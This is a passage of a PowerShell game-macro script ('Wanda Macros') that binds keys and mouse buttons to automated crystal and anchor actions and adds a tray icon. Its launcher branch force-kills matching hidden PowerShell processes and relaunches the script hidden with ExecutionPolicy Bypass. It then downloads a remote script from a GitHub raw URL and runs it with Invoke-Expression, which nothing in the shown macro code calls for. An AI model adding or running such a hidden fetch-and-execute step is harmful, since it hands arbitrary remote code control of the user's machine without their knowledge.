            if ($script:listening -ge 0 -and $script:guiForm -and -not $script:guiForm.IsDisposed -and $script:guiForm.Visible) {
                $mb  = ([Win32]::GetAsyncKeyState(0x04) -band 0x8000) -ne 0
                $xb1 = ([Win32]::GetAsyncKeyState(0x05) -band 0x8000) -ne 0
                $xb2 = ([Win32]::GetAsyncKeyState(0x06) -band 0x8000) -ne 0
                if ($mb  -and -not $script:mbWas)  { Finish-Listen "Mouse3" }
                if ($xb1 -and -not $script:xb1Was) { Finish-Listen "Mouse4" }
                if ($xb2 -and -not $script:xb2Was) { Finish-Listen "Mouse5" }
                $script:mbWas  = $mb
                $script:xb1Was = $xb1
                $script:xb2Was = $xb2
            } else {
                $script:mbWas  = $false
                $script:xb1Was = $false
                $script:xb2Was = $false
            }

            if ($script:listening -lt 0) {
                if ($script:btnStates[0] -and $script:btnKeys[0] -ne "None") {
                    $vk0 = Get-VKCode $script:btnKeys[0]
                    if ($vk0 -gt 0) {
                        $cur0 = ([Win32]::GetAsyncKeyState($vk0) -band 0x8000) -ne 0
                        if ($cur0 -and -not $script:triggerWas[0]) {
                            Run-HitCrystal-OnPress
                        }
                        if ($cur0) {
                            Run-HitCrystal-WhileHolding
                        }
                        $script:triggerWas[0] = $cur0
                    }
                } else {
                    $script:triggerWas[0] = $false
                }

                if ($script:btnStates[1] -and $script:btnKeys[1] -ne "None") {
                    $vk1 = Get-VKCode $script:btnKeys[1]
                    if ($vk1 -gt 0) {
                        $cur1 = ([Win32]::GetAsyncKeyState($vk1) -band 0x8000) -ne 0
                        if ($cur1 -and -not $script:triggerWas[1]) {
                            Run-SingleAnchor
                        }
                        $script:triggerWas[1] = $cur1
                    }
                } else {
                    $script:triggerWas[1] = $false
                }

                if ($script:btnStates[2] -and $script:btnKeys[2] -ne "None") {
                    $vk2 = Get-VKCode $script:btnKeys[2]
                    if ($vk2 -gt 0) {
                        $cur2 = ([Win32]::GetAsyncKeyState($vk2) -band 0x8000) -ne 0
                        if ($cur2 -and -not $script:triggerWas[2]) {
                            Run-DoubleAnchor
                        }
                        $script:triggerWas[2] = $cur2
                    }
                } else {
                    $script:triggerWas[2] = $false
                }
            }
        } catch {}
    })
    $timer.Start()

    # ── Tray icon ──

    $tray = New-Object System.Windows.Forms.NotifyIcon
    $tray.Text    = "Wanda Macros - Home to toggle"
    $tray.Visible = $true

    $bmp = New-Object System.Drawing.Bitmap(16,16)
    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
    $gfx.Clear([System.Drawing.ColorTranslator]::FromHtml("#cba6f7"))
    $gfx.Dispose()
    $tray.Icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())

    $menu = New-Object System.Windows.Forms.ContextMenuStrip
    $exit = New-Object System.Windows.Forms.ToolStripMenuItem("Exit Wanda Macros")
    $exit.Add_Click({
        $timer.Stop()
        $tray.Visible = $false; $tray.Dispose()
        if ($script:guiForm -and -not $script:guiForm.IsDisposed) { $script:guiForm.Dispose() }
        [System.Windows.Forms.Application]::Exit()
    })
    $menu.Items.Add($exit) | Out-Null
    $tray.ContextMenuStrip = $menu
    $tray.Add_DoubleClick({
        if ($null -eq $script:guiForm -or $script:guiForm.IsDisposed) {
            $script:guiForm = New-BrxtwurstForm
        }
        if ($script:guiForm.Visible) { $script:guiForm.Hide() }
        else { $script:guiForm.Show(); $script:guiForm.Activate() }
    })

    $script:guiForm = New-BrxtwurstForm

    $appCtx = New-Object System.Windows.Forms.ApplicationContext
    [System.Windows.Forms.Application]::Run($appCtx)
} else {
    $ErrorActionPreference = 'Stop'
    $scriptPath = $null
    if ($PSCommandPath) { $scriptPath = $PSCommandPath }
    if (-not $scriptPath -and $MyInvocation.MyCommand.Path) { $scriptPath = $MyInvocation.MyCommand.Path }
    if (-not $scriptPath) {
        $def = $MyInvocation.MyCommand.Definition
        if ($def -and $def.Length -lt 300 -and $def -match '\.ps1' -and (Test-Path $def -ErrorAction SilentlyContinue)) {
            $scriptPath = $def
        }
    }
    if (-not $scriptPath) {
        $inv = $MyInvocation.InvocationName
        if ($inv -and $inv -match '\.ps1' -and (Test-Path $inv -ErrorAction SilentlyContinue)) {
            $scriptPath = $inv
        }
    }
    if (-not $scriptPath) {
        $cl = [Environment]::CommandLine
        if ($cl -match "(?:&|\.)\s*'([^']+\.ps1)'") { $scriptPath = $Matches[1] }
        elseif ($cl -match '(?:&|\.)\s*"([^"]+\.ps1)"') { $scriptPath = $Matches[1] }
        elseif ($cl -match "'([^']+\.ps1)'") { $scriptPath = $Matches[1] }
        elseif ($cl -match '"([^"]+\.ps1)"') { $scriptPath = $Matches[1] }
    }
    if (-not $scriptPath) {
        $searchDirs = @(
            (Join-Path $env:USERPROFILE 'Documents\Projects'),
            (Join-Path $env:USERPROFILE 'Documents'),
            (Join-Path $env:USERPROFILE 'Desktop'),
            $env:USERPROFILE
        )
        foreach ($dir in $searchDirs) {
            if (Test-Path $dir) {
                $found = Get-ChildItem -Path $dir -Filter 'BrxtwurstMcrs.ps1' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($found) { $scriptPath = $found.FullName; break }
            }
        }
    }

    $scriptDir = if ($scriptPath) { Split-Path -Parent $scriptPath } else { $env:TEMP }

    try {
        $myPid = $PID
        Get-Process | Where-Object {
            $_.Id -ne $myPid -and
            $_.ProcessName -match "powershell|pwsh" -and
            $_.MainWindowTitle -eq ""
        } | ForEach-Object {
            try {
                $cmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
                if ($cmdLine -and $cmdLine -match "BrxtwurstMcrs") {
                    Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                }
            } catch {}
        }

        if (-not $scriptPath -or -not (Test-Path $scriptPath)) {
            throw "Could not find script path. PSCommandPath='$PSCommandPath' Path='$($MyInvocation.MyCommand.Path)'"
        }

        Start-Process -WindowStyle Hidden -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
            -ArgumentList "-ExecutionPolicy Bypass -STA -NoProfile -File `"$scriptPath`" -MacroMode"

        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
        Invoke-Expression (Invoke-RestMethod "https://raw.githubusercontent.com/HadronCollision/PowershellScripts/refs/heads/main/HabibiModAnalyzer.ps1")
    } catch {
        Write-Host "ERROR: $_" -ForegroundColor Red
        Read-Host "Press Enter to exit"
    }
}
